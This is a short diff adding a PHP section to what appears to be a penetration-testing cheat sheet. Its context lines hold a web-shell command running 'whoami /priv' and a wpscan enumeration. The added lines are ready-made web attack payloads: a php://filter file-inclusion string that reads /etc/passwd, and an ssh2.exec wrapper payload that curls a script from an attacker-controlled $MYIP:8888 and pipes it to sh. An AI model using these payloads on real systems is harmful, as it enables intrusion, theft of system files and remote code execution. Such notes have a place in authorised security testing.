@@ -294,6 +294,12 @@ curl -G --path-as-is 'http://$TARGET/x.aspx' --data-urlencode 'cmd=whoami /priv'
 </body>
 </html>
 
+[*] PHP
+https://www.php.net/manual/en/wrappers.php
+
+index.php?page=php://filter/convert.base64-encode|convert.base64-decode/resource=file://../../../../../../../etc/passwd
+index.php?page=ssh2.exec://UERNAME:PASSWORD@127.0.0.1/curl+$MYIP:8888/resh|sh;
+
 [*] WordPress
 wpscan --url http://$TARGET/wordpress --enumerate
 Download source > https://develop.svn.wordpress.org/tags/x.x.x/src/
